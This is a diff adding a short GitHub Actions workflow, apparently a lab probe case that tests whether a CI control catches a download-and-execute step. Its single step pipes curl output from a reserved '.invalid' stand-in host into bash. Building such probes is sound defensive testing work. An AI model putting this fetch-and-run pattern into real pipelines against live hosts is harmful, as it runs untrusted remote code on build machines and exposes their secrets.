@@ -1,0 +1,20 @@
+name: Hold probe 04 - download and execute
+
+on:
+  push:
+    branches:
+      - case-04-download-execute
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
+      - name: Pipe a reserved invalid endpoint to a shell
+        run: |
+          curl --silent --show-error --max-time 3 \
+            https://payload-host.invalid/bootstrap.sh | bash
+          printf '%s\n' 'HOLD_LAB_CASE=download-execute'
